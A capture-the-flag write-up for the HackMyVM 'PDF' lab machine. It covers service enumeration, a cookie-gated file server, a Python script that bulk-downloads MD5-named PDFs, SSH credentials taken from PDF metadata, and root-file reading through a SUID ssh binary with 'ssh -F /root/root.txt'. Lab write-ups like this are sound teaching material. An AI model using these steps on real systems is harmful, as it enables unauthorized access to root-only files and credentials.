<h1 align="center">
  PDF-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=pdf">PDF</a>
</h1>

> **Summary:** Enumerate services → discover cookie-protected file server on `:8080` → download numbered PDFs → extract credentials from PDF metadata → SSH as `welcome` → escalate via **misconfigured SUID/SGID** `/usr/bin/ssh` using GTFOBins `ssh -F` (file read).

# PDF (HackMyVM) — Write-up

## Overview

**Goal:** Gain root on the *pdf* machine.

**Attack path (high level):**
1. Enumerate services (SSH/HTTP).
2. Discover a cookie-gated file server on **:8080**.
3. Download numbered PDFs whose filenames are **MD5(number)**.
4. Extract SSH credentials from **PDF metadata**.
5. SSH as `welcome`.
6. Privilege escalate via **misconfigured SUID/SGID** `/usr/bin/ssh` using **GTFOBins** (`ssh -F` to read a root-only file).

---

## Table of Contents
- [1) Enumeration](#1-enumeration)
- [2) Web discovery (port 80)](#2-web-discovery-port-80)
- [3) Port 8080 — cookie-protected File Management System](#3-port-8080--cookie-protected-file-management-system)
- [4) Download PDFs](#4-download-pdfs)
- [5) Extract credentials from PDF metadata](#5-extract-credentials-from-pdf-metadata)
- [6) SSH as welcome](#6-ssh-as-welcome)
- [7) Privilege escalation (SUID/SGID ssh)](#7-privilege-escalation-suidsgid-ssh)

---

## 1) Enumeration

```zsh
┌──(cool㉿kali)-[~]
└─$ hmv pdf
```

```zsh
└─$ cat nmap-pdf-full.log
# Nmap 7.98 scan initiated Mon Dec 29 08:25:26 2025 as: /usr/lib/nmap/nmap --privileged -v -p- -sC -sV -T4 -oA /home/cool/HMV/pdf/scans/nmap-pdf-full -oN /home/cool/HMV/pdf/scans/nmap-pdf-full.log 192.168.56.143
Nmap scan report for pdf.hmv (192.168.56.143)
Host is up (0.0099s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Golang net/http server
```

**Notes:**
- `:80` hosts a static site.
- `:8080` looks like a custom web app (“File Management System”).

---

## 2) Web discovery (port 80)

Directory enumeration quickly revealed a `hint.txt`.

```zsh
┌──(cool㉿kali)-[~/HMV/pdf]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u $url -t 500 -o ferox-$ip.log

200      GET        1l        7w       44c http://pdf.hmv/hint.txt
```

```zsh
┌──(cool㉿kali)-[~/HMV/pdf]
└─$ curl $url/hint.txt
What's the ultimate answer to the universe?
```

This is the classic reference to **42**.

---

## 3) Port 8080 — cookie-protected File Management System

Browsing to `http://$ip:8080/` shows a “File Management System” and appears to require a cookie named `session_token`.

Based on the hint from port 80, the token value is **42**.

**Working cookie:**
- `session_token=42`

---

## 4) Download PDFs

The application serves PDFs via an endpoint like:

- `http://$ip:8080/view/?filename=<md5(NUM)>.pdf`

I initially tried a one-liner loop, but it didn’t clearly validate which responses were real PDFs. I switched to a small Python script that:
- Sets the cookie
- Computes MD5s
- Checks for `application/pdf` (or `%PDF` magic bytes)
- Saves valid results
- Stops after repeated misses

```python
#!/usr/bin/env python3
import hashlib
from pathlib import Path

import requests


def is_pdf_response(resp: requests.Response) -> bool:
    ctype = (resp.headers.get("Content-Type") or "").lower()
    if "application/pdf" in ctype:
        return True
    return resp.content.startswith(b"%PDF")


def download_pdfs(
    ip: str = "192.168.56.143",
    port: int = 8080,
    cookie_name: str = "session_token",
    cookie_value: str = "42",
    start: int = 1,
    end: int = 100,
    out_dir: str = "downloads",
    timeout: int = 10,
    stop_after_consecutive_misses: int = 15,
) -> None:
    base_url = f"http://{ip}:{port}/view/?filename="
    out_path = Path(out_dir)
    out_path.mkdir(parents=True, exist_ok=True)

    sess = requests.Session()
    sess.cookies.set(cookie_name, cookie_value)

    consecutive_misses = 0
    downloaded = 0

    for num in range(start, end):
        md5_hash = hashlib.md5(str(num).encode()).hexdigest()
        pdf_url = f"{base_url}{md5_hash}.pdf"
        filename = out_path / f"{num}.pdf"

        if filename.exists() and filename.stat().st_size > 0:
            print(f"[=] Skip (exists): {filename}")
            continue

        try:
            resp = sess.get(pdf_url, timeout=timeout, allow_redirects=True)

            if resp.status_code != 200:
                consecutive_misses += 1
                print(f"[-] {num}: HTTP {resp.status_code}")
            elif not resp.content:
                consecutive_misses += 1
                print(f"[-] {num}: empty body")
            elif not is_pdf_response(resp):
                consecutive_misses += 1
                print(f"[-] {num}: not a PDF (Content-Type={resp.headers.get('Content-Type')})")
            else:
                filename.write_bytes(resp.content)
                downloaded += 1
                consecutive_misses = 0
                print(f"[+] Downloaded: {filename} ({len(resp.content)} bytes)")

            if stop_after_consecutive_misses and consecutive_misses >= stop_after_consecutive_misses:
                print(f"[!] Stopping: {consecutive_misses} consecutive misses.")
                break

        except requests.Timeout:
            consecutive_misses += 1
            print(f"[!] {num}: timeout")
        except requests.RequestException as e:
            consecutive_misses += 1
            print(f"[!] {num}: request error: {e}")

    print(f"\nDone. Downloaded: {downloaded}. Saved in: {out_path.resolve()}")


if __name__ == "__main__":
    download_pdfs()
```

Run it:

```zsh
┌──(cool㉿kali)-[~/HMV/pdf/exploits]
└─$ chmod +x pdf_downloader.py
└─$ ./pdf_downloader.py
[+] Downloaded: downloads/1.pdf (1191 bytes)
...
[+] Downloaded: downloads/99.pdf (1193 bytes)

Done. Downloaded: 99. Saved in: /home/cool/HMV/pdf/exploits/downloads
```

---

## 5) Extract credentials from PDF metadata

Once the PDFs were downloaded, I searched for interesting strings across all files.

```zsh
strings -n 6 -a **/* 2>/dev/null | sort -u
```

Flags for the command above:
- `-n 6` → reduce noisy short strings (default is 4)
- `-a` → treat all files as binary
- `**/*` → recursive glob (zsh)
- `sort -u` → unique output

This revealed a very useful metadata entry:

```
/Author (welcome:lamar57)
```

To confirm which PDF contains it:

```zsh
┌──(cool㉿kali)-[~/HMV/pdf/exploits/downloads]
└─$ for f in *.pdf; do
  strings -n 6 -a "$f" | grep -i author && echo "PDF NO : $f "
done
/Author (welcome:lamar57)
PDF NO : 57.pdf
```

So the credentials are:
- **User:** `welcome`
- **Password:** `lamar57`

---

## 6) SSH as welcome

```zsh
┌──(cool㉿kali)-[~/HMV/pdf/exploits/downloads]
└─$ ssh welcome@$ip
welcome@192.168.56.143's password: 
Linux pdf 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

welcome@pdf:~$ ls
user.txt
```

`sudo` is not available for this user:

```zsh
welcome@pdf:~$ sudo -l
Sorry, user welcome may not run sudo on pdf.
```

---

## 7) Privilege escalation (SUID/SGID ssh)

### Finding interesting SUID/SGID binaries

```zsh
welcome@pdf:~$ find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/ssh
...

welcome@pdf:~$ ls -l /usr/bin/ssh
-rwsr-sr-x 1 root root 797480 Dec 21  2023 /usr/bin/ssh
```

`ssh` being both **SUID** and **SGID** root is a red flag.

Normally, privileged operations in OpenSSH are handled by `sshd` and helper binaries (e.g., `ssh-keysign`). The *client* binary (`ssh`) should not need to run with elevated privileges.

### Exploiting SUID ssh via `-F` (GTFOBins)

GTFOBins documents that `ssh -F <file>` will read a configuration file. When `ssh` is SUID root, this becomes a **file read primitive** (even if the config parsing fails, the file contents can leak via error messages).

Since `/usr/bin/ssh` is SUID/SGID `root`, it can be abused as a **file-read** primitive using `-F` [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/) . The trick is to point `-F` at a file we want to read; `ssh` parses it as config and prints the first line as an “invalid option”.


In this box, the root flag is stored in `/root/root.txt`, so we can point `-F` to it:

```zsh
welcome@pdf:~$ ssh -F /root/root.txt localhost
/root/root.txt: line 1: Bad configuration option: flag{root-21d72a06840925613b0ea50e84587620}
/root/root.txt: terminating, 1 bad configuration options
```

The error message prints the first line of the file, which contains the root flag.

---

## Flags

- **User:** `user.txt` (in `/home/welcome/user.txt`)
- **Root:** `root.txt`  (in `/root/root.txt`)


## Notes / Takeaways

- PDF metadata can leak credentials (Author/Creator fields are worth checking).
- SUID on client tools is almost always a serious misconfiguration.
